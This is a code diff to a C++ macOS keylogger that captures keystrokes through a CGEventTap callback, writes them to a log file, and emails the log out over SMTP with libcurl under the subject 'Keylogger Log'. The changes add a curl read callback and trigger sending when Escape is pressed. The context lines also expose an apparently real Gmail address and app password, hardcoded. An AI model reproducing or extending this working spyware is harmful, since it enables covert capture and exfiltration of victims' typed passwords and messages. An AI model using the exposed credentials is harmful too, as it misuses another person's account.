@@ -13,6 +13,24 @@ const char* email_user = "dennis.pidduck@gmail.com"; // Replace with your Gmail 
 const char* email_password = "xglvswysuejigfhq"; // Replace with your Gmail password (use App password if 2FA is enabled)
 const char* recipient_email = "dennis.pidduck@gmail.com"; // Email address where you want to receive the log
 
+size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp) {
+    std::string *email_data = (std::string *)userp;
+    size_t total_size = size * nmemb;
+
+    if (email_data->empty()) {
+        return 0;  // No more data to send
+    }
+
+    // Copy data from email_data to the buffer ptr
+    size_t to_copy = std::min(total_size, email_data->size());
+    memcpy(ptr, email_data->c_str(), to_copy);
+
+    // Erase the copied portion from email_data
+    email_data->erase(0, to_copy);
+
+    return to_copy;  // Return the number of bytes copied
+}
+
 // Function to log the key to a file
 void logKey(const std::string& key) {
     std::ofstream file(logFile, std::ios::app);  // Open file in append mode
@@ -29,16 +47,20 @@ void logKey(const std::string& key) {
 }
 
 // Function to send the log file via email
+#include <curl/curl.h>  // Ensure libcurl is included
+
 void sendEmail() {
     CURL *curl;
     CURLcode res;
     struct curl_slist *recipients = NULL;
 
-    curl = curl_easy_init();  // Initialize curl
+    curl = curl_easy_init();
     if (curl) {
+        std::cout << "Curl initialized successfully." << std::endl;
+
         // Set SMTP server and login details
         curl_easy_setopt(curl, CURLOPT_URL, smtp_server);
-        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);  // Use TLS/SSL
+        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
         curl_easy_setopt(curl, CURLOPT_USERNAME, email_user);
         curl_easy_setopt(curl, CURLOPT_PASSWORD, email_password);
 
@@ -53,16 +75,21 @@ void sendEmail() {
             std::cerr << "Failed to open log file." << std::endl;
             return;
         }
-        std::string logContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
 
+        std::string logContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
         std::string email_data = "To: " + std::string(recipient_email) + "\r\n" +
                                  "From: " + std::string(email_user) + "\r\n" +
                                  "Subject: Keylogger Log\r\n" +
                                  "\r\n" + logContent;
 
-        // Set email data
+        // Set the read callback function
+        curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
+
+        // Pass the email data to the callback
         curl_easy_setopt(curl, CURLOPT_READDATA, &email_data);
         curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
+
+        std::cout << "Sending email..." << std::endl;
 
         // Perform the request
         res = curl_easy_perform(curl);
@@ -71,12 +98,12 @@ void sendEmail() {
         if (res != CURLE_OK) {
             std::cerr << "Failed to send email: " << curl_easy_strerror(res) << std::endl;
         } else {
-            std::cout << "Log file emailed successfully." << std::endl;
+            std::cout << "Email sent successfully." << std::endl;
         }
 
         // Clean up
-        curl_slist_free_all(recipients);  // Clean up recipients list
-        curl_easy_cleanup(curl);          // Clean up curl session
+        curl_slist_free_all(recipients);
+        curl_easy_cleanup(curl);
     } else {
         std::cerr << "Curl initialization failed." << std::endl;
     }
@@ -90,9 +117,10 @@ CGEventRef keyCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event
         CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
         switch (keycode) {
-            case 0x35:  // Esc key
+            case 0x35:  // Esc key (check this is the correct keycode for Esc)
                 logKey("Escape");
-                shouldExit = true;  // Set the flag to true, signaling the program to exit
+                sendEmail();  // Ensure sendEmail() is called here
+                shouldExit = true;  // Set the flag to exit the loop after sending email
                 break;
             case 0x31:  // Spacebar
                 logKey("Space");
